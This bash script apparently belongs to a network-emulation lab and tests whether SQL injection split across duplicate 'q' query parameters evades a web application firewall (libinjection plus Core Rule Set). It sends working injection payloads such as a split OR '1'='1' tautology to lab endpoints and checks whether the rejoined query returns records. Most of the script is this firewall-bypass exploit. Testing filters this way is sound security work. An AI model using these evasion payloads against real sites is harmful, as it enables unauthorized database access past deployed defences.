#!/bin/bash
# Always-join HPF variant: duplicate ?q= values are ALWAYS concatenated
# no ?split toggle. Just two q params nothing in the url shows a join.
# This tests whether the split POINT lets the halves
# slip the FULL CRS (libinjection + regex rules), not just libinjection.
# Usage:
#   kathara exec attacker -- /scripts/run_fragmentation_noflag.sh
set -u

ENFORCE="${1:-http://172.30.0.10}"        # :80  enforcing WAF
DETECT="${2:-http://172.30.0.10:8080}"    # :8080 detection-only

rows(){ curl -s -G "$1/teamsearch" "${@:2}" | grep -c '/records/'; }
code(){ curl -s -G "$1/teamsearch" "${@:2}" -o /dev/null -w '%{http_code}'; }

echo "[hpf] /teamsearch always joins duplicate q — no flag in the request"
echo "[hpf] 1. naive split  @:80 : HTTP $(code "$ENFORCE" --data-urlencode "q=zzz%' OR '1'='" --data-urlencode "q=1'-- -")   (frag1 is fingerprinted -> expect 403)"
echo "[hpf] 2. evading split @:80 : HTTP $(code "$ENFORCE" --data-urlencode "q=zzz%'" --data-urlencode "q= OR '1'='1'-- -")   (both halves pass libinjection)"
echo "[hpf] 3. evading split @:8080: rows $(rows "$DETECT" --data-urlencode "q=zzz%'" --data-urlencode "q= OR '1'='1'-- -")   (rejoined -> injects)"
echo "[hpf] 4. benign single q @:8080: rows $(rows "$DETECT" --data-urlencode "q=Alice")   (normal search)"
